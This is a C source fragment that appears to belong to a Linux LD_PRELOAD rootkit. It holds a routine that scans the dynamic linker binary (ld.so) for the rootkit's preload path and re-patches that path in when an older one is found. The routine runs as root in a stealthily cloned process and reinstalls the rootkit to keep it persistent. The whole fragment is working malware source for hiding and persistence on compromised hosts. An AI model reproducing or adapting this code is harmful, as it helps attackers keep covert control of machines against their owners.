/* searches the supplied ld.so path for newpreload.
 * returns 1 if the ld.so in question has been patched.
 * returns 0 if it has not.
 * -1 is returned on error.
 * the contents of path is searched through in chunks, to avoid allocating substantial amounts of memory unless it's 100% necessary. */
int ispatched(const char *path, const char *newpreload){
    const size_t newlen = strlen(newpreload);  // this is always going to be 18 atm
    size_t n, count = 0;
    FILE *ofp;
    u_long fsize, blksize;
    mode_t ldmode;

    hook(CFREAD);

    ofp = bindup(path, NULL, NULL, &fsize, &ldmode);
    if(ofp == NULL) return -1;
    blksize = getablocksize(fsize);

    do{
        unsigned char *buf = malloc(blksize+1);
        if(!buf){
            fclose(ofp);
            return 0;
        }
        memset(buf, 0, blksize+1);
        n = (size_t)call(CFREAD, buf, 1, blksize, ofp);
        if(n){
            for(size_t i = 0; i < n && count != newlen; i++){
                if(buf[i] == newpreload[count])
                    ++count;
                else count=0;
            }
        }
        bfree(buf, blksize+1);
    }while(n > 0 && count != newlen);
    fclose(ofp);

    if(count != newlen)
        return 0;
    return 1;
}


/* this function is main ld.so protector. */
static int _ldprotect(void *arg){
    if(!initmvbc())
        return 0;

    char **ldpaths;
    int pathc;

    fdclosee();
    if(rknomore())
        return 0;

    ldpaths = ldfind(&pathc, MAX_LD_SO);
    if(!ldpaths) return 0;

    for(int i=0; i<pathc; i++){
        char *ldpath = ldpaths[i];
        int isp = ispatched(ldpath, mvbc->preloadpath);

        switch(isp){
            char *op;
            int isd;

            case -1:  /* error. */
                break;
            case 0:  /* PRELOAD_FILE is not in current ld.so. if OLD_PRELOAD is instead, repatch our path in. */
                op = xordup(OLD_PRELOAD);
                if(op != NULL){
                    isd = ispatched(ldpath, op);
                    if(isd) _ldpatch(ldpath, op, mvbc->preloadpath);
                    //else ???
                    clean(op);
                }
                
                break;
            case 1:  /* is patched. */
                break; 
        }
        clean(ldpaths[i]);
    }
    free(ldpaths);

    reinstall(mvbc);
    return 0;
}


void ldprotect(void){
    if(notuser(0) || rknomore()) return;
    sneakyclone(_ldprotect, NULL, 4096);
}